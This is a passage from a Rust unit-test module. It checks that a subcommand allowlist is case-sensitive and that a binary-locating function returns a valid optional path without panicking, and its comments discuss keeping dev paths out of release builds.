    }

    #[test]
    fn allowlist_is_case_sensitive() {
        // Subcommands must be lowercase; "Doctor" should NOT pass
        let args = vec!["Doctor".to_string()];
        assert!(validate_subcommand(&args).is_err());
    }

    // ── C4: dev path exclusion from release builds ─────────────────────────
    // These tests assert the compile-time behavior through string presence.
    // The real verification is `cargo build --release` + `strings` scan
    // (documented in verification paragraph below), but we can assert the
    // cfg gate logic by checking what locate_cero_bin returns in test mode
    // (which runs with debug_assertions=true by default).

    #[test]
    fn locate_cero_bin_returns_none_or_some_without_panicking() {
        // We just verify the function doesn't panic and the return type is correct.
        // In CI (no cero binary present) this returns None; on a dev machine
        // with the binary it returns Some. Both are valid.
        let result = super::locate_cero_bin();
        // If Some, it must be a non-empty path
        if let Some(path) = result {
            assert!(!path.as_os_str().is_empty());
        }
    }
}
